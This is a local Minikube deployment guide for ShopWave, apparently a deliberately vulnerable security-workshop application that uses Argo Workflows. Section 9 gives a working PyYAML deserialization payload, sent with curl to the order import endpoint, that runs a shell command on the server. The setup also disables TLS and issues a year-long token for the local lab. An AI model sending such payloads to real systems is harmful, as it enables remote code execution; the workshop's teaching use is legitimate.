# Deploy ShopWave on Minikube (local)

Step-by-step guide to run ShopWave on a local [Minikube](https://minikube.sigs.k8s.io/) cluster, including **Argo Workflows** for the order pipeline.

**Time:** ~20–30 minutes first run.

## Prerequisites

| Tool | Check |
|------|--------|
| [Minikube](https://minikube.sigs.k8s.io/docs/start/) | `minikube version` |
| [kubectl](https://kubernetes.io/docs/tasks/tools/) | `kubectl version --client` |
| [Docker](https://docs.docker.com/get-docker/) | `docker version` |

From the repo root (`shopwave/`):

```bash
cd /path/to/shopwave
```

---

## 1. Start Minikube

```bash
minikube start --cpus=4 --memory=8192 --driver=docker
```

Verify:

```bash
kubectl cluster-info
minikube status
```

---

## 2. Use Minikube’s Docker daemon (build images inside Minikube)

So Kubernetes can use local images **without pushing to a registry**:

```bash
eval $(minikube docker-env)
```

Confirm Docker points at Minikube:

```bash
docker info | grep "Name: minikube"
```

> Run this `eval` in **every new terminal** before building images.

---

## 3. Build application images

```bash
docker build -t shopwave-order-service:latest ./order-service
docker build -t shopwave-notification-service:latest ./notification-service
docker build -t shopwave-shopwave-web:latest ./shopwave-web
```

Check images:

```bash
docker images | grep shopwave
```

Use overlay **`k8s/overlays/local`** so manifests pull local tags (`shopwave-*:latest`) instead of GHCR. See [README.md](README.md#deploy-on-kubernetes) for remote clusters.

---

## 4. Install Argo Workflows

ShopWave’s order-service submits workflows to the **Argo Server API**. Install Argo into an `argo` namespace:

```bash
kubectl create namespace argo
kubectl apply -n argo -f https://github.com/argoproj/argo-workflows/releases/download/v3.5.12/install.yaml
```

Enable **client** auth mode (Kubernetes service account tokens) and HTTP for local Minikube:

```bash
kubectl -n argo patch deployment argo-server --type='json' -p='[
  {"op": "replace", "path": "/spec/template/spec/containers/0/args", "value": ["server","--auth-mode=client","--secure=false"]},
  {"op": "replace", "path": "/spec/template/spec/containers/0/readinessProbe/httpGet/scheme", "value": "HTTP"}
]'
```

Wait until Argo is ready:

```bash
kubectl -n argo rollout status deployment/argo-server
kubectl -n argo rollout status deployment/workflow-controller
```

---

## 5. Deploy ShopWave and wire the Argo token

Apply manifests (includes `order-service-argo` RBAC):

```bash
kubectl apply -k k8s/overlays/local
```

Create a long-lived token for `order-service` and patch the secret (replaces the placeholder in `secrets/argo-api-token.yaml`). Full explanation: [README.md § Create ARGO_TOKEN](README.md#create-argo_token).

```bash
TOKEN=$(kubectl -n production create token order-service-argo --duration=8760h)
kubectl -n production patch secret argo-api-token \
  -p "{\"stringData\":{\"token\":\"Bearer ${TOKEN}\"}}"
kubectl -n production rollout restart deployment/order-service
```

`order-service` must use **`ARGO_SCHEME=http`** (set in `k8s/base/order-service/deployment.yaml`) because the local Argo server runs without TLS.

---

## 6. Configure secrets (optional edits)

`sendgrid-api-key.yaml` can stay as the workshop placeholder unless you need a real key.

Re-apply if you changed secrets on disk:

```bash
kubectl apply -k k8s/overlays/local
```

Wait for pods:

```bash
kubectl -n production get pods -w
```

All should reach `Running` (may take 1–2 minutes).

---

## 7. Access the app

The browser calls **`/api/orders/*` on the storefront** (same origin). The Next.js server proxies to `ORDER_API_URL` (`http://order-service:8080` in `k8s/base/shopwave-web/deployment.yaml`) **at request time** — no build-time URL and no extra env patch for the browser.

To change the backend URL after deploy:

```bash
kubectl -n production set env deployment/shopwave-web \
  ORDER_API_URL=http://order-service:8080
kubectl -n production rollout status deployment/shopwave-web
```

**Storefront**

```bash
kubectl -n production port-forward svc/shopwave-web 3000:80
```

Open: **http://localhost:3000**

**Order API (optional, direct)**

```bash
kubectl -n production port-forward svc/order-service 8080:8080
```

→ **http://localhost:8080/docs**

**Notification service (optional)**

```bash
kubectl -n production port-forward svc/notification-service 3001:3000
```

---

## 8. Verify the full flow

1. **Health**

   ```bash
   curl http://localhost:8080/health
   curl http://localhost:3000/
   ```

2. **Place an order** — checkout on http://localhost:3000

3. **Workflow created** — order response should include a `workflow_id` (not `"unknown"`):

   ```bash
   kubectl -n production logs deploy/order-service --tail=20
   kubectl -n production get workflows
   ```

4. **Argo UI (optional)**

   ```bash
   kubectl -n argo port-forward svc/argo-server 2746:2746
   ```

   Open https://localhost:2746 (accept TLS warning) or use `argo list -n production`.

---

## 9. Workshop exploit / import (optional)

With order-service port-forwarded on 8080:

```bash
curl -s -X POST http://localhost:8080/api/v1/orders/import \
  -H 'Content-Type: application/x-yaml' \
  --data-binary '!!python/object/apply:subprocess.check_output
- !!python/tuple
  - !!python/object/new:str ["id"]'
```

Or use **http://localhost:3000/orders/import** (footer → Bulk import) — traffic goes through the runtime proxy at `/api/orders/import`.

See [WORKSHOP.md](../WORKSHOP.md) for vulnerability details and payloads.

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| `ImagePullBackOff` | Run `eval $(minikube docker-env)` and rebuild images; tags must match manifests (`shopwave-*-service:latest`). |
| `workflow_id: "unknown"` | Check `ARGO_TOKEN` secret, Argo server reachability from order-service, logs: `kubectl -n production logs deploy/order-service`. |
| Checkout fails from browser | Check `ORDER_API_URL` on `shopwave-web` and logs: `kubectl -n production logs deploy/shopwave-web`. Ensure `order-service` is reachable from the web pod. |
| Web 500 on `/api/orders/*` | Verify `ORDER_API_URL` (runtime env). From web pod: `wget -qO- http://order-service:8080/health`. |
| PVC pending | `minikube addons enable default-storageclass` or `minikube addons enable storage-provisioner`. |
| Argo workflows not listed | Workflows run in `production`; `kubectl get workflows -n production`. |

**Reset everything**

```bash
kubectl delete -k k8s/overlays/local --ignore-not-found
kubectl delete namespace argo --ignore-not-found
minikube delete
```

---

## What gets deployed

| Resource | Namespace | Role |
|----------|-----------|------|
| order-service | production | API, SQLite PVC, submits Argo workflows |
| shopwave-web | production | Next.js storefront |
| notification-service | production | Workflow completion webhook |
| argo-workflow-sa | production | Identity for workflow pods (Secret mount) |
| sendgrid-api-key | production | Secret used in send-invoice step |
| argo-server / controller | argo | Workflow engine (installed separately) |

Architecture and workflow behaviour: [README.md](README.md).

---

## Quick reference (copy-paste)

```bash
minikube start --cpus=4 --memory=8192
eval $(minikube docker-env)
docker build -t shopwave-order-service:latest ./order-service
docker build -t shopwave-notification-service:latest ./notification-service
docker build -t shopwave-shopwave-web:latest ./shopwave-web

kubectl create namespace argo
kubectl apply -n argo -f https://github.com/argoproj/argo-workflows/releases/download/v3.5.12/install.yaml
# patch argo-server auth-mode (see step 4), create token (step 5), edit k8s/base/secrets/argo-api-token.yaml

kubectl apply -k k8s/overlays/local

kubectl -n production port-forward svc/shopwave-web 3000:80
# Optional: direct order API
# kubectl -n production port-forward svc/order-service 8080:8080
```

Open **http://localhost:3000**.
